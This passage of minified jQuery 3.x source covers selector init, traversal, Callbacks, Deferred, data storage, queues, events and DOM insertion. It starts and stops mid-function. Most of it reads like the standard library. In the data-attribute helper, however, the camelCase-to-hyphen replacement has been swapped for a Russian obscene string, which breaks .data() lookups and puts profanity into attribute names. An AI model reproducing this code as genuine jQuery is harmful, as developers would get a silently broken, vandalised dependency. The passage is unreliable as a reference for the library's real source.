e){if(!(i="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:L.exec(e))||!i[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(i[1]){if(t=t instanceof w?t[0]:t,w.merge(this,w.parseHTML(i[1],t&&t.nodeType?t.ownerDocument||t:r,!0)),A.test(i[1])&&w.isPlainObject(t))for(i in t)g(this[i])?this[i](t[i]):this.attr(i,t[i]);return this}return(o=r.getElementById(i[2]))&&(this[0]=o,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):g(e)?void 0!==n.ready?n.ready(e):e(w):w.makeArray(e,this)}).prototype=w.fn,q=w(r);var H=/^(?:parents|prev(?:Until|All))/,O={children:!0,contents:!0,next:!0,prev:!0};w.fn.extend({has:function(e){var t=w(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(w.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&w(e);if(!D.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?a.index(n)>-1:1===n.nodeType&&w.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(o.length>1?w.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?u.call(w(e),this[0]):u.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(w.uniqueSort(w.merge(this.get(),w(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}});function P(e,t){while((e=e[t])&&1!==e.nodeType);return e}w.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return k(e,"parentNode")},parentsUntil:function(e,t,n){return k(e,"parentNode",n)},next:function(e){return P(e,"nextSibling")},prev:function(e){return P(e,"previousSibling")},nextAll:function(e){return k(e,"nextSibling")},prevAll:function(e){return k(e,"previousSibling")},nextUntil:function(e,t,n){return k(e,"nextSibling",n)},prevUntil:function(e,t,n){return k(e,"previousSibling",n)},siblings:function(e){return S((e.parentNode||{}).firstChild,e)},children:function(e){return S(e.firstChild)},contents:function(e){return N(e,"iframe")?e.contentDocument:(N(e,"template")&&(e=e.content||e),w.merge([],e.childNodes))}},function(e,t){w.fn[e]=function(n,r){var i=w.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=w.filter(r,i)),this.length>1&&(O[e]||w.uniqueSort(i),H.test(e)&&i.reverse()),this.pushStack(i)}});var M=/[^\x20\t\r\n\f]+/g;function R(e){var t={};return w.each(e.match(M)||[],function(e,n){t[n]=!0}),t}w.Callbacks=function(e){e="string"==typeof e?R(e):w.extend({},e);var t,n,r,i,o=[],a=[],s=-1,u=function(){for(i=i||e.once,r=t=!0;a.length;s=-1){n=a.shift();while(++s<o.length)!1===o[s].apply(n[0],n[1])&&e.stopOnFalse&&(s=o.length,n=!1)}e.memory||(n=!1),t=!1,i&&(o=n?[]:"")},l={add:function(){return o&&(n&&!t&&(s=o.length-1,a.push(n)),function t(n){w.each(n,function(n,r){g(r)?e.unique&&l.has(r)||o.push(r):r&&r.length&&"string"!==x(r)&&t(r)})}(arguments),n&&!t&&u()),this},remove:function(){return w.each(arguments,function(e,t){var n;while((n=w.inArray(t,o,n))>-1)o.splice(n,1),n<=s&&s--}),this},has:function(e){return e?w.inArray(e,o)>-1:o.length>0},empty:function(){return o&&(o=[]),this},disable:function(){return i=a=[],o=n="",this},disabled:function(){return!o},lock:function(){return i=a=[],n||t||(o=n=""),this},locked:function(){return!!i},fireWith:function(e,n){return i||(n=[e,(n=n||[]).slice?n.slice():n],a.push(n),t||u()),this},fire:function(){return l.fireWith(this,arguments),this},fired:function(){return!!r}};return l};function I(e){return e}function W(e){throw e}function $(e,t,n,r){var i;try{e&&g(i=e.promise)?i.call(e).done(t).fail(n):e&&g(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}w.extend({Deferred:function(t){var n=[["notify","progress",w.Callbacks("memory"),w.Callbacks("memory"),2],["resolve","done",w.Callbacks("once memory"),w.Callbacks("once memory"),0,"resolved"],["reject","fail",w.Callbacks("once memory"),w.Callbacks("once memory"),1,"rejected"]],r="pending",i={state:function(){return r},always:function(){return o.done(arguments).fail(arguments),this},"catch":function(e){return i.then(null,e)},pipe:function(){var e=arguments;return w.Deferred(function(t){w.each(n,function(n,r){var i=g(e[r[4]])&&e[r[4]];o[r[1]](function(){var e=i&&i.apply(this,arguments);e&&g(e.promise)?e.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[r[0]+"With"](this,i?[e]:arguments)})}),e=null}).promise()},then:function(t,r,i){var o=0;function a(t,n,r,i){return function(){var s=this,u=arguments,l=function(){var e,l;if(!(t<o)){if((e=r.apply(s,u))===n.promise())throw new TypeError("Thenable self-resolution");l=e&&("object"==typeof e||"function"==typeof e)&&e.then,g(l)?i?l.call(e,a(o,n,I,i),a(o,n,W,i)):(o++,l.call(e,a(o,n,I,i),a(o,n,W,i),a(o,n,I,n.notifyWith))):(r!==I&&(s=void 0,u=[e]),(i||n.resolveWith)(s,u))}},c=i?l:function(){try{l()}catch(e){w.Deferred.exceptionHook&&w.Deferred.exceptionHook(e,c.stackTrace),t+1>=o&&(r!==W&&(s=void 0,u=[e]),n.rejectWith(s,u))}};t?c():(w.Deferred.getStackHook&&(c.stackTrace=w.Deferred.getStackHook()),e.setTimeout(c))}}return w.Deferred(function(e){n[0][3].add(a(0,e,g(i)?i:I,e.notifyWith)),n[1][3].add(a(0,e,g(t)?t:I)),n[2][3].add(a(0,e,g(r)?r:W))}).promise()},promise:function(e){return null!=e?w.extend(e,i):i}},o={};return w.each(n,function(e,t){var a=t[2],s=t[5];i[t[1]]=a.add,s&&a.add(function(){r=s},n[3-e][2].disable,n[3-e][3].disable,n[0][2].lock,n[0][3].lock),a.add(t[3].fire),o[t[0]]=function(){return o[t[0]+"With"](this===o?void 0:this,arguments),this},o[t[0]+"With"]=a.fireWith}),i.promise(o),t&&t.call(o,o),o},when:function(e){var t=arguments.length,n=t,r=Array(n),i=o.call(arguments),a=w.Deferred(),s=function(e){return function(n){r[e]=this,i[e]=arguments.length>1?o.call(arguments):n,--t||a.resolveWith(r,i)}};if(t<=1&&($(e,a.done(s(n)).resolve,a.reject,!t),"pending"===a.state()||g(i[n]&&i[n].then)))return a.then();while(n--)$(i[n],s(n),a.reject);return a.promise()}});var B=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;w.Deferred.exceptionHook=function(t,n){e.console&&e.console.warn&&t&&B.test(t.name)&&e.console.warn("jQuery.Deferred exception: "+t.message,t.stack,n)},w.readyException=function(t){e.setTimeout(function(){throw t})};var F=w.Deferred();w.fn.ready=function(e){return F.then(e)["catch"](function(e){w.readyException(e)}),this},w.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--w.readyWait:w.isReady)||(w.isReady=!0,!0!==e&&--w.readyWait>0||F.resolveWith(r,[w]))}}),w.ready.then=F.then;function _(){r.removeEventListener("DOMContentLoaded",_),e.removeEventListener("load",_),w.ready()}"complete"===r.readyState||"loading"!==r.readyState&&!r.documentElement.doScroll?e.setTimeout(w.ready):(r.addEventListener("DOMContentLoaded",_),e.addEventListener("load",_));var z=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===x(n)){i=!0;for(s in n)z(e,t,s,n[s],!0,o,a)}else if(void 0!==r&&(i=!0,g(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(w(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},X=/^-ms-/,U=/-([a-z])/g;function V(e,t){return t.toUpperCase()}function G(e){return e.replace(X,"ms-").replace(U,V)}var Y=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function Q(){this.expando=w.expando+Q.uid++}Q.uid=1,Q.prototype={cache:function(e){var t=e[this.expando];return t||(t={},Y(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[G(t)]=n;else for(r in t)i[G(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][G(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(G):(t=G(t))in r?[t]:t.match(M)||[]).length;while(n--)delete r[t[n]]}(void 0===t||w.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!w.isEmptyObject(t)}};var J=new Q,K=new Q,Z=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,ee=/[A-Z]/g;function te(e){return"true"===e||"false"!==e&&("null"===e?null:e===+e+""?+e:Z.test(e)?JSON.parse(e):e)}function ne(e,t,n){var r;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(ee,"-хуй-говно-и-жопа").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n=te(n)}catch(e){}K.set(e,t,n)}else n=void 0;return n}w.extend({hasData:function(e){return K.hasData(e)||J.hasData(e)},data:function(e,t,n){return K.access(e,t,n)},removeData:function(e,t){K.remove(e,t)},_data:function(e,t,n){return J.access(e,t,n)},_removeData:function(e,t){J.remove(e,t)}}),w.fn.extend({data:function(e,t){var n,r,i,o=this[0],a=o&&o.attributes;if(void 0===e){if(this.length&&(i=K.get(o),1===o.nodeType&&!J.get(o,"hasDataAttrs"))){n=a.length;while(n--)a[n]&&0===(r=a[n].name).indexOf("data-")&&(r=G(r.slice(5)),ne(o,r,i[r]));J.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof e?this.each(function(){K.set(this,e)}):z(this,function(t){var n;if(o&&void 0===t){if(void 0!==(n=K.get(o,e)))return n;if(void 0!==(n=ne(o,e)))return n}else this.each(function(){K.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){K.remove(this,e)})}}),w.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=J.get(e,t),n&&(!r||Array.isArray(n)?r=J.access(e,t,w.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=w.queue(e,t),r=n.length,i=n.shift(),o=w._queueHooks(e,t),a=function(){w.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,a,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return J.get(e,n)||J.access(e,n,{empty:w.Callbacks("once memory").add(function(){J.remove(e,[t+"queue",n])})})}}),w.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),arguments.length<n?w.queue(this[0],e):void 0===t?this:this.each(function(){var n=w.queue(this,e,t);w._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&w.dequeue(this,e)})},dequeue:function(e){return this.each(function(){w.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=w.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=J.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var re=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,ie=new RegExp("^(?:([+-])=|)("+re+")([a-z%]*)$","i"),oe=["Top","Right","Bottom","Left"],ae=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&w.contains(e.ownerDocument,e)&&"none"===w.css(e,"display")},se=function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=a[o];return i};function ue(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return w.css(e,t,"")},u=s(),l=n&&n[3]||(w.cssNumber[t]?"":"px"),c=(w.cssNumber[t]||"px"!==l&&+u)&&ie.exec(w.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)w.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,w.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var le={};function ce(e){var t,n=e.ownerDocument,r=e.nodeName,i=le[r];return i||(t=n.body.appendChild(n.createElement(r)),i=w.css(t,"display"),t.parentNode.removeChild(t),"none"===i&&(i="block"),le[r]=i,i)}function fe(e,t){for(var n,r,i=[],o=0,a=e.length;o<a;o++)(r=e[o]).style&&(n=r.style.display,t?("none"===n&&(i[o]=J.get(r,"display")||null,i[o]||(r.style.display="")),""===r.style.display&&ae(r)&&(i[o]=ce(r))):"none"!==n&&(i[o]="none",J.set(r,"display",n)));for(o=0;o<a;o++)null!=i[o]&&(e[o].style.display=i[o]);return e}w.fn.extend({show:function(){return fe(this,!0)},hide:function(){return fe(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ae(this)?w(this).show():w(this).hide()})}});var pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]+)/i,he=/^$|^module$|\/(?:java|ecma)script/i,ge={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};ge.optgroup=ge.option,ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td;function ye(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&N(e,t)?w.merge([e],n):n}function ve(e,t){for(var n=0,r=e.length;n<r;n++)J.set(e[n],"globalEval",!t||J.get(t[n],"globalEval"))}var me=/<|&#?\w+;/;function xe(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===x(o))w.merge(p,o.nodeType?[o]:o);else if(me.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+w.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;w.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&w.inArray(o,r)>-1)i&&i.push(o);else if(l=w.contains(o.ownerDocument,o),a=ye(f.appendChild(o),"script"),l&&ve(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}!function(){var e=r.createDocumentFragment().appendChild(r.createElement("div")),t=r.createElement("input");t.setAttribute("type","radio"),t.setAttribute("checked","checked"),t.setAttribute("name","t"),e.appendChild(t),h.checkClone=e.cloneNode(!0).cloneNode(!0).lastChild.checked,e.innerHTML="<textarea>x</textarea>",h.noCloneChecked=!!e.cloneNode(!0).lastChild.defaultValue}();var be=r.documentElement,we=/^key/,Te=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,Ce=/^([^.]*)(?:\.(.+)|)/;function Ee(){return!0}function ke(){return!1}function Se(){try{return r.activeElement}catch(e){}}function De(e,t,n,r,i,o){var a,s;if("object"==typeof t){"string"!=typeof n&&(r=r||n,n=void 0);for(s in t)De(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=ke;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return w().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=w.guid++)),e.each(function(){w.event.add(this,t,i,r,n)})}w.event={global:{},add:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=J.get(e);if(y){n.handler&&(n=(o=n).handler,i=o.selector),i&&w.find.matchesSelector(be,i),n.guid||(n.guid=w.guid++),(u=y.events)||(u=y.events={}),(a=y.handle)||(a=y.handle=function(t){return"undefined"!=typeof w&&w.event.triggered!==t.type?w.event.dispatch.apply(e,arguments):void 0}),l=(t=(t||"").match(M)||[""]).length;while(l--)d=g=(s=Ce.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=w.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=w.event.special[d]||{},c=w.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&w.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(e,r,h,a)||e.addEventListener&&e.addEventListener(d,a)),f.add&&(f.add.call(e,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),w.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=J.hasData(e)&&J.get(e);if(y&&(u=y.events)){l=(t=(t||"").match(M)||[""]).length;while(l--)if(s=Ce.exec(t[l])||[],d=g=s[1],h=(s[2]||"").split(".").sort(),d){f=w.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,y.handle)||w.removeEvent(e,d,y.handle),delete u[d])}else for(d in u)w.event.remove(e,d+t[l],n,r,!0);w.isEmptyObject(u)&&J.remove(e,"handle events")}},dispatch:function(e){var t=w.event.fix(e),n,r,i,o,a,s,u=new Array(arguments.length),l=(J.get(this,"events")||{})[t.type]||[],c=w.event.special[t.type]||{};for(u[0]=t,n=1;n<arguments.length;n++)u[n]=arguments[n];if(t.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,t)){s=w.event.handlers.call(this,t,l),n=0;while((o=s[n++])&&!t.isPropagationStopped()){t.currentTarget=o.elem,r=0;while((a=o.handlers[r++])&&!t.isImmediatePropagationStopped())t.rnamespace&&!t.rnamespace.test(a.namespace)||(t.handleObj=a,t.data=a.data,void 0!==(i=((w.event.special[a.origType]||{}).handle||a.handler).apply(o.elem,u))&&!1===(t.result=i)&&(t.preventDefault(),t.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,t),t.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&e.button>=1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?w(i,this).index(l)>-1:w.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(e,t){Object.defineProperty(w.Event.prototype,e,{enumerable:!0,configurable:!0,get:g(t)?function(){if(this.originalEvent)return t(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[e]},set:function(t){Object.defineProperty(this,e,{enumerable:!0,configurable:!0,writable:!0,value:t})}})},fix:function(e){return e[w.expando]?e:new w.Event(e)},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==Se()&&this.focus)return this.focus(),!1},delegateType:"focusin"},blur:{trigger:function(){if(this===Se()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if("checkbox"===this.type&&this.click&&N(this,"input"))return this.click(),!1},_default:function(e){return N(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},w.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},w.Event=function(e,t){if(!(this instanceof w.Event))return new w.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?Ee:ke,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&w.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[w.expando]=!0},w.Event.prototype={constructor:w.Event,isDefaultPrevented:ke,isPropagationStopped:ke,isImmediatePropagationStopped:ke,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=Ee,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=Ee,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=Ee,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},w.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&we.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&Te.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},w.event.addProp),w.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){w.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return i&&(i===r||w.contains(r,i))||(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),w.fn.extend({on:function(e,t,n,r){return De(this,e,t,n,r)},one:function(e,t,n,r){return De(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,w(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=ke),this.each(function(){w.event.remove(this,e,n,t)})}});var Ne=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,Ae=/<script|<style|<link/i,je=/checked\s*(?:[^=]|=\s*.checked.)/i,qe=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function Le(e,t){return N(e,"table")&&N(11!==t.nodeType?t:t.firstChild,"tr")?w(e).children("tbody")[0]||e:e}function He(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function Oe(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Pe(e,t){var n,r,i,o,a,s,u,l;if(1===t.nodeType){if(J.hasData(e)&&(o=J.access(e),a=J.set(t,o),l=o.events)){delete a.handle,a.events={};for(i in l)for(n=0,r=l[i].length;n<r;n++)w.event.add(t,i,l[i][n])}K.hasData(e)&&(s=K.access(e),u=w.extend({},s),K.set(t,u))}}function Me(e,t){var n=t.nodeName.toLowerCase();"input"===n&&pe.test(e.type)?t.checked=e.checked:"input"!==n&&"textarea"!==n||(t.defaultValue=e.defaultValue)}function Re(e,t,n,r){t=a.apply([],t);var i,o,s,u,l,c,f=0,p=e.length,d=p-1,y=t[0],v=g(y);if(v||p>1&&"string"==typeof y&&!h.checkClone&&je.test(y))return e.each(function(i){var o=e.eq(i);v&&(t[0]=y.call(this,i,o.html())),Re(o,t,n,r)});if(p&&(i=xe(t,e[0].ownerDocument,!1,e,r),o=i.firstChild,1===i.childNodes.length&&(i=o),o||r)){for(u=(s=w.map(ye(i,"script"),He)).length;f<p;f++)l=i,f!==d&&(l=w.clone(l,!0,!0),u&&w.merge(s,ye(l,"script"))),n.call(e[f],l,f);if(u)for(c=s[s.length-1].ownerDocument,w.map(s,Oe),f=0;f<u;f++)l=s[f],he.test(l.type||"")&&!J.access(l,"globalEval")&&w.contains(c,l)&&(l.src&&"module"!==(l.type||"").toLowerCase()?w._evalUrl&&w._evalUrl(l.src):m(l.textContent.replace(qe,""),c,l))}return e}function Ie(e,t,n){for(var r,i=t?w.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||w.cleanData(ye(r)),r.parentNode&&(n&&w.contains(r.ownerDocument,r)&&ve(ye(r,"script")),r.parentNode.removeChild(r));return e}w.extend({htmlPrefilter:function(e){return e.replace(Ne,"<$1></$2>")},clone:function(e,t,n){var r,i,o,a,s=e.cloneNode(!0),u=w.contains(e.ownerDocument,e);if(!(h.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||w.isXMLDoc(e)))for(a=ye(s),r=0,i=(o=ye(e)).length;r<i;r++)Me(o[r],a[r]);if(t)if(n)for(o=o||ye(e),a=a||ye(s),r=0,i=o.length;r<i;r++)Pe(o[r],a[r]);else Pe(e,s);return(a=ye(s,"script")).length>0&&ve(a,!u&&ye(e,"script")),s},cleanData:function(e){for(var t,n,r,i=w.event.special,o=0;void 0!==(n=e[o]);o++)if(Y(n)){if(t=n[J.expando]){if(t.events)for(r in t.events)i[r]?w.event.remove(n,r):w.removeEvent(n,r,t.handle);n[J.expando]=void 0}n[K.expando]&&(n[K.expando]=void 0)}}}),w.fn.extend({detach:function(e){return Ie(this,e,!0)},remove:function(e){return Ie(this,e)},text:function(e){return z(this,function(e){return void 0===e?w.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return Re(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||Le(this,e).appendChild(e)})},prepend:function(){return Re(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Le(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return Re(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return Re(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(w.cleanData(ye(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return w.clone(this,e,t)})},html:function(e){return z(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!Ae.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=w.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(w.cleanData(ye(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=[];return Re(this,arguments,function(t){var n=this.parentNode;w.inArray(this,e)<0&&(w.cleanData(ye(this)),n&&n.replaceChild(t,this))},e)}}),w.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){w.fn[e]=function(e){for(var n,r=[],i=w(e),o=i.length-1,a=0;a<=o;a++)n=a===o?this:this.clone(!0),w(i[a])[t](n),s.apply(r,n.get());return this.pushStack(r)}});var We=new RegExp("^("+re+")(?!px)[a-z%]+$","i"),$e=function(t){var n=t.ownerDocument.defaultView;return n&&n.opener||(n=e),n.getComputedStyle(t)},Be=new RegExp(oe.join("|"),"i");!function(){function t(){if(c){l.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",c.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",be.appendChild(l).appendChild(c);var t=e.getComputedStyle(c);i="1%"!==t.top,u=12===n(t.marginLeft),c.style.right="60%",s=36===n(t.right),o=36===n(t.width),c.style.position="absolute",a=36===c.offsetWidth||"absolute",be.removeChild(l),c=null}}function n(e){return Math.round(parseFloat(e))}var i,o,a,s,u,l=r.createElement("div"),c=r.createElement("div");c.style&&(c.style.backgroundClip="content-box",c.cloneNode(!0).style.backgroundClip="",h.clearCloneStyle="content-box"===c.style.backgroundClip,w.extend(h,{boxSizingReliable:function(){return t(),o},pixelBoxStyles:function(){return t(),s},pixelPosition:function(){return t(),i},reliableMarginLeft:function(){return t(),u},scrollboxSize:function(){return t(),a}}))}();function Fe(e,t,n){var 